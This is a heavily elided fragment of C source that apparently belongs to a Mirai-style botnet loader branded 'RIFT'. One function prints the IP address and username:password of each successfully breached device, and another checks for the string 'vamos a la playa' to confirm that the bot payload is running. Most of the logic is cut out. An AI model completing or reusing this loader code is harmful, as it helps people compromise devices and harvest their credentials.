...
void connection_close(struct connection *conn)
{
    ...
    if(conn->open)
    {
        ...
        if(conn->success)
        {
            ...
            fprintf(stderr, "\x1b[38;5;196m[RIFT] \033[97m(\033[95m%d.%d.%d.%d\033[97m) | \033[97m[\x1b[94m%s:%s\033[97m] \033[97m(\033[92m%s\033[97m)\n\033[0m\r",
...
int connection_verify_payload(struct connection *conn)
{
    ...
    if(util_memsearch(conn->rdbuf, offset, "vamos a la playa", 10) == -1)
        return offset;
    else
        return 255 + offset;
}
